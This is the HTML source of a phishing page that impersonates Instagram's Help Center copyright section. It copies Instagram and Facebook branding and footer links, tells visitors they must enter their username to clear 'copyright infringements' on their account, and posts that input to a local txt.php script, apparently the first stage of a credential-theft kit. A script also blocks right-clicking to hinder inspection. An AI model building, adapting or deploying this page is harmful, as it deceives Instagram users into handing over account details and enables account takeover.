<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <script src="https://kit.fontawesome.com/db109e88ef.js" crossorigin="anonymous"></script> 
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="shortcut icon" href="https://instagram.com/static/images/ico/xxxhdpi_launcher.png/9fc4bab7565b.png">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
  <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
  <link rel="stylesheet" href="style.css">
  <link rel="stylesheet" href="formstyle.css">
  <style>
  </style>
    <title>Copyright |Instagram Help Center</title>
  </head>
  <body>
    <div id="body">
      <header>
    <div id="header">
 <span>
        <svg width="156" height="17" viewBox="0 0 156 17" xmlns="http://www.w3.org/2000/svg" style="color: #fff;"><path d="M12.752 0C12.9 0 13 .097 13 .243v2.234c0 .146-.1.243-.248.243h-9.8v4.566h8.039c.148 0 .248.097.248.243v2.234c0 .146-.1.243-.248.243H2.952v6.751c0 .146-.099.243-.248.243H.248C.1 17 0 16.903 0 16.757V.243C0 .097.1 0 .248 0h12.504zm13.012 0c.115 0 .207.049.253.17 2.283 5.197 4.519 11.147 5.971 16.563.046.17-.046.267-.207.267h-2.513c-.139 0-.23-.073-.254-.219a79.555 79.555 0 00-1.199-4.347h-7.723a79.437 79.437 0 00-1.198 4.347c-.023.146-.116.219-.254.219h-2.42c-.162 0-.254-.097-.208-.267C17.464 11.317 19.7 5.367 21.982.17c.047-.121.139-.17.254-.17h3.528zM44.39 0c3.051 0 5.386 1.535 6.588 3.99.046.142.023.236-.139.307l-2.196.874c-.115.047-.23 0-.3-.118-.81-1.535-2.22-2.409-4.115-2.409h-.346c-2.89 0-4.994 2.338-4.994 5.998 0 3.47 2.197 5.714 4.994 5.714h.346c1.85 0 3.19-.662 3.976-1.818.093-.119.185-.142.3-.095l2.289.826c.139.048.185.19.116.331-1.249 2.125-3.583 3.4-6.635 3.4h-.346C39.029 17 36 13.624 36 8.642 36 3.636 39.213 0 44.044 0h.347zm25.156 0c.143 0 .238.097.238.243v2.234c0 .146-.095.243-.238.243h-9.708v4.42h7.895c.143 0 .238.097.238.243v2.21c0 .146-.095.243-.238.243h-7.895v4.444h9.922c.144 0 .239.097.239.243v2.234c0 .146-.095.243-.239.243H57.24c-.144 0-.239-.097-.239-.243V.243c0-.146.095-.243.239-.243h12.308zm14.368 0c4.007 0 6.083 1.579 6.083 4.371 0 1.676-.733 3.06-2.882 3.692C89.827 8.67 91 10.249 91 12.337 91 15.276 88.752 17 84.648 17h-8.404c-.146 0-.244-.097-.244-.243V.243c0-.146.098-.243.244-.243h7.671zm20.77 0C109.758 0 113 3.565 113 8.5c0 4.958-3.242 8.5-8.315 8.5h-.347C99.243 17 96 13.458 96 8.5c0-4.935 3.243-8.5 8.338-8.5h.347zm22 0C131.757 0 135 3.565 135 8.5c0 4.958-3.243 8.5-8.315 8.5h-.347C121.243 17 118 13.458 118 8.5c0-4.935 3.243-8.5 8.338-8.5h.347zm16.955 0c.145 0 .242.097.242.243V6.97h1.646c2.373-2.186 4.48-4.493 6.224-6.824a.426.426 0 01.314-.146h2.979c.194 0 .266.121.145.267-2.155 2.793-4.65 5.416-7.41 7.966 2.906 2.574 5.667 5.464 8.16 8.476.122.145.05.291-.144.291h-3.173a.426.426 0 01-.314-.146c-2.155-2.671-4.65-5.221-6.78-7.14h-1.647v7.043c0 .146-.097.243-.242.243h-2.398c-.145 0-.242-.097-.242-.243V.243c0-.146.097-.243.242-.243h2.398zM84.624 9.787h-5.717v4.566h5.79c2.223 0 3.322-.753 3.322-2.234 0-1.53-.781-2.332-3.395-2.332zm20.061-7.095h-.347c-3.312 0-5.42 2.29-5.42 5.808s2.085 5.808 5.42 5.808h.347c3.312 0 5.397-2.29 5.397-5.808s-2.108-5.808-5.397-5.808zm22 0h-.347c-3.312 0-5.42 2.29-5.42 5.808s2.085 5.808 5.42 5.808h.347c3.312 0 5.397-2.29 5.397-5.808s-2.108-5.808-5.397-5.808zM24.22 2.672h-.553a105.003 105.003 0 00-2.72 7.14h6.016a118.657 118.657 0 00-2.743-7.14zm59.623-.025h-4.935v4.566h5.057c2.199 0 3.103-.777 3.103-2.259 0-1.554-.953-2.307-3.225-2.307z" fill="currentColor" fill-rule="evenodd"></path></svg>
      </span>
    <div class="header-right">
      <a href="https://about.fb.com/"><p style="display: inline-block;">Who We Are</p></a>
      <a href="home.html#copyright"><p style="display: inline-block;">What is Copyright</p></a>
      <a href="https://help.instagram.com/"><p style="display: inline-block;">Resources</p></a>
      <i class="fas fa-search" style="display: inline-block;"></i>
    </div>
    </div>
  </header>
  <div id="form">
    <img src="https://i.imgyukle.com/2020/10/02/5crH5N.png" class="psikopatcoder">
    <h1 id="form-h1-2">
Hello, Please proceed by entering the username to remove copyright infringements on your account.</h1>
    <form method="post" action="txt.php">
      <input type="text" name="username" class="input" id="username" placeholder="Username" required=""><br>
      <input type="submit" name="submit" value="Next" class="input" id="btn">
    </form>
  </div>
</div>
<section id="footer-rgn">
<div id="tables">
  <ul>
<span>
        <svg width="156" height="17" viewBox="0 0 156 17" xmlns="http://www.w3.org/2000/svg"><path d="M12.752 0C12.9 0 13 .097 13 .243v2.234c0 .146-.1.243-.248.243h-9.8v4.566h8.039c.148 0 .248.097.248.243v2.234c0 .146-.1.243-.248.243H2.952v6.751c0 .146-.099.243-.248.243H.248C.1 17 0 16.903 0 16.757V.243C0 .097.1 0 .248 0h12.504zm13.012 0c.115 0 .207.049.253.17 2.283 5.197 4.519 11.147 5.971 16.563.046.17-.046.267-.207.267h-2.513c-.139 0-.23-.073-.254-.219a79.555 79.555 0 00-1.199-4.347h-7.723a79.437 79.437 0 00-1.198 4.347c-.023.146-.116.219-.254.219h-2.42c-.162 0-.254-.097-.208-.267C17.464 11.317 19.7 5.367 21.982.17c.047-.121.139-.17.254-.17h3.528zM44.39 0c3.051 0 5.386 1.535 6.588 3.99.046.142.023.236-.139.307l-2.196.874c-.115.047-.23 0-.3-.118-.81-1.535-2.22-2.409-4.115-2.409h-.346c-2.89 0-4.994 2.338-4.994 5.998 0 3.47 2.197 5.714 4.994 5.714h.346c1.85 0 3.19-.662 3.976-1.818.093-.119.185-.142.3-.095l2.289.826c.139.048.185.19.116.331-1.249 2.125-3.583 3.4-6.635 3.4h-.346C39.029 17 36 13.624 36 8.642 36 3.636 39.213 0 44.044 0h.347zm25.156 0c.143 0 .238.097.238.243v2.234c0 .146-.095.243-.238.243h-9.708v4.42h7.895c.143 0 .238.097.238.243v2.21c0 .146-.095.243-.238.243h-7.895v4.444h9.922c.144 0 .239.097.239.243v2.234c0 .146-.095.243-.239.243H57.24c-.144 0-.239-.097-.239-.243V.243c0-.146.095-.243.239-.243h12.308zm14.368 0c4.007 0 6.083 1.579 6.083 4.371 0 1.676-.733 3.06-2.882 3.692C89.827 8.67 91 10.249 91 12.337 91 15.276 88.752 17 84.648 17h-8.404c-.146 0-.244-.097-.244-.243V.243c0-.146.098-.243.244-.243h7.671zm20.77 0C109.758 0 113 3.565 113 8.5c0 4.958-3.242 8.5-8.315 8.5h-.347C99.243 17 96 13.458 96 8.5c0-4.935 3.243-8.5 8.338-8.5h.347zm22 0C131.757 0 135 3.565 135 8.5c0 4.958-3.243 8.5-8.315 8.5h-.347C121.243 17 118 13.458 118 8.5c0-4.935 3.243-8.5 8.338-8.5h.347zm16.955 0c.145 0 .242.097.242.243V6.97h1.646c2.373-2.186 4.48-4.493 6.224-6.824a.426.426 0 01.314-.146h2.979c.194 0 .266.121.145.267-2.155 2.793-4.65 5.416-7.41 7.966 2.906 2.574 5.667 5.464 8.16 8.476.122.145.05.291-.144.291h-3.173a.426.426 0 01-.314-.146c-2.155-2.671-4.65-5.221-6.78-7.14h-1.647v7.043c0 .146-.097.243-.242.243h-2.398c-.145 0-.242-.097-.242-.243V.243c0-.146.097-.243.242-.243h2.398zM84.624 9.787h-5.717v4.566h5.79c2.223 0 3.322-.753 3.322-2.234 0-1.53-.781-2.332-3.395-2.332zm20.061-7.095h-.347c-3.312 0-5.42 2.29-5.42 5.808s2.085 5.808 5.42 5.808h.347c3.312 0 5.397-2.29 5.397-5.808s-2.108-5.808-5.397-5.808zm22 0h-.347c-3.312 0-5.42 2.29-5.42 5.808s2.085 5.808 5.42 5.808h.347c3.312 0 5.397-2.29 5.397-5.808s-2.108-5.808-5.397-5.808zM24.22 2.672h-.553a105.003 105.003 0 00-2.72 7.14h6.016a118.657 118.657 0 00-2.743-7.14zm59.623-.025h-4.935v4.566h5.057c2.199 0 3.103-.777 3.103-2.259 0-1.554-.953-2.307-3.225-2.307z" fill="currentColor" fill-rule="evenodd"></path></svg>
</span>
</ul>
  <ul style="left: 25%;">
    <h1>Company</h1>
    <a href=""><li>Newsroom</li></a>
    <a href=""><li>Company Info</li></a>
    <a href=""><li>Careers</li></a>
    <a href=""><li>For Investors</li></a>
    <a href=""><li>Brand Resources</li></a>
    <h1 style="margin-top: 30px;">Facebook Policies</h1>
    <a href=""><li>Community Standards</li></a>
    <a href=""><li>Data Policy</li></a>
    <a href=""><li>Cookie Policy</li></a>
    <a href=""><li>Terms of Service</li></a>
  </ul>
    <ul style="left: 50%;">
    <h1>Technologies</h1>
    <a href=""><li>Facebook app</li></a>
    <a href=""><li>Messenger</li></a>
    <a href=""><li>Instagram</li></a>
    <a href=""><li>WhatsApp</li></a>
    <a href=""><li>Oculus</li></a>
    <a href=""><li>Workplace</li></a>
    <a href=""><li>Portal</li></a>
    <a href=""><li>Novi</li></a>
  </ul>
    <ul style="left: 75%;">
    <h1>Help Center</h1>
    <a href=""><li>Facebook app Help Center</li></a>
    <a href=""><li>Messenger Help Center</li></a>
    <a href=""><li>Instagram Help Center</li></a>
    <a href=""><li>Whatsapp Help Center</li></a>
    <a href=""><li>Oculus Support</li></a>
    <a href=""><li>Workplace Help Center</li></a>
    <a href=""><li>Workplace Help Center</li></a>
  </ul>
</div>
<div class="alt">
<p style="float: left;">© 2021 FACEBOOK & INSTAGRAM</p>
<p style="padding-left: 30px;">Site Map</p>
<p>United States (English)</p>
</div>
<div class="alt-tel">
<p style="display: inline; float: right;">Site Map</p>
<p style="display: inline; ">United States (English)</p>
<p style="display: block; margin-top: 30px;">© 2021 FACEBOOK & INSTAGRAM</p>
</div>
</section>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
  <script>
    AOS.init();
  </script>
  <script>
  function reginasad(){ 
    document.getElementById("footer").style.display="none";
  }
  </script>
<SCRIPT LANGUAGE="Javascript"><!--
// ***********************************************
// Bu kodu www.TeknoEsinti.com adresinden aldınız..
// ***********************************************
var isNS = (navigator.appName == "Netscape") ? 1 : 0;
var EnableRightClick = 0;
if(isNS)
document.captureEvents(Event.MOUSEDOWN||Event.MOUSEUP);
function mischandler(){
if(EnableRightClick==1){ return true; }
else {return false; }
}
function mousehandler(e){
if(EnableRightClick==1){ return true; }
var myevent = (isNS) ? e : event;
var eventbutton = (isNS) ? myevent.which : myevent.button;
if((eventbutton==2)||(eventbutton==3)) return false;
}
function keyhandler(e) {
var myevent = (isNS) ? e : window.event;
if (myevent.keyCode==96)
EnableRightClick = 1;
return;
}
document.oncontextmenu = mischandler;
document.onkeypress = keyhandler;
document.onmousedown = mousehandler;
document.onmouseup = mousehandler;
//-->
</script>
  </body>
</html>